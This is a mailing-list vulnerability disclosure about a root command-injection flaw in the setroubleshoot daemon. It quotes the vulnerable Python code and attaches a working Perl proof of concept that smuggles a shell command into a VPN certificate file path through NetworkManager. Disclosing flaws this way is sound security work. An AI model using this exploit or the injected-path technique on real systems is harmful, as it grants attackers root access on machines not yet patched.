  oss-security - Fwd: setroubleshoot root exploit (CVE-Request)            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Thu, 26 Mar From: Sebastian Krahmer <krahmer@...e.de> To: oss-security@...ts.openwall.com Subject: Fwd: setroubleshoot root exploit (CVE-Request)   As per list policy, here is the forward of the distros post. CRD was shifted to today.   ----- Forwarded message from Sebastian Krahmer <krahmer@...e.de> -----  Date: Wed, 18 Mar From: Sebastian Krahmer <krahmer@...e.de> To: distros@...openwall.org subject: ***UNCHECKED*** [vs] setroubleshoot root exploit (CVE-Request) X-Mailer: MIME-tools (Entity  Hi  I already sent this to upstream. Initially I thought this only affects redhat, but it seems that ubuntu is also using setroubleshoot. CRD is  setroubleshoot tries to find out which rpm a particular file belongs to when it finds SELinux access violation reports. The idea is probably to have convenient reports for the admin which type enforcement rules have to be relaxed. setroubleshoot runs as root (although in its own domain). In util.py we have:   def get_rpm_nvr_by_file_path_temporary(name):     if name is None or not os.path.exists(name):         return None      nvr = None     try:         import commands         rc, output = commands.getstatusoutput("rpm -qf '%s'" % name)         if rc == 0:             nvr = output     except:         syslog.syslog(syslog.LOG_ERR, "failed to retrieve rpm info for %s" %     name)     return nvr  (and other similar occurences)  So. Yes, thats correct: The SELinux system that is only there to protect you, passes attacker controlled data to sh -c (https://docs.python.org/2/library/commands.html) inside a daemon running as root. Sacken lassen...  I attached a PoC which uses networkmanager's openvpn plugin to execute arbitraty commands by triggering an access violation to a pathname which contains shell commands.  The setroubleshootd_t domain has quite a lot of allowed rules and transitions, so this can clearly count as privilege escalation. Furthermore a lot of admins run their system in permissive mode (full root) even when its shipped enforcing by default.  Also note that there are potentially remote vectors, if attackers can control part of the filenames being created (web uploads, git, scp, ftp etc).  Sebastian   PS: I am all for SELinux but theres something on the wrong way. I counted the LOC, and the core SELinux (kernel) has a smaller codebase than whats framed around in python, running as root and mangling attacker controlled input. IOW, the system that wants to protect you has fewer code enforcing the rules than code that potentially blows up your system. And that code is python, so let alone all the python modules and interpreter hat can have bugs on its own. Driving such a lane _can only lead to abyss_. And I am not saying that evil powers are creating an overly complex system to better hide their bugdoors within.  PPS: bug-logo will follow :)  --   ~ perl self.pl ~ ~ krahmer@...e.de - SuSE Security Team   #!/usr/bin/perl  # # Fedora21 setroubleshootd local root PoC # # (C) Sebastian Krahmer # # - requires polkit authorization to add/mod VPN connections #   to NetworkManager (default on desktop user) # - after execution of this script, which adds appropriate #   NM connection entries, try # #  $ nmcli c up vpn-FOOBAR # # a couple of times, until you see: # # uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:setroubleshootd_t:... # # in the journalctl logs # # PS: I know in advance what the SELinux developers will say... :p # # I say: lulz!    # create a pathname that setroubleshootd will eventually # query sh -c { rpm -qf ... with, fucking up ' escaping. So the # embedded pathname is then evaluated as command # # There goes your NSA-grade SELinux security!!!  $file = "/tmp/foo.pem';`id|logger`;echo '"; open(O, ">", $file) or die $!; close O;  # add connection system("nmcli c add type vpn ifname FOOBAR vpn-type openvpn"); open(O,"|nmcli c edit vpn-FOOBAR") or die $!;  print O "set vpn.data ca = /tmp/foo.pem';`id|logger`;echo ', password-flags = 1, connection-type = password, remote = username = FOOBAR\n"; print O "set vpn.secrets password=1\nsave\nquit\n"; close(O);   print "Now do 'nmcli c up vpn-FOOBAR' and watch logs.\n";     ----- End forwarded message -----  --   ~ perl self.pl ~ ~ krahmer@...e.de - SuSE Security Team   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      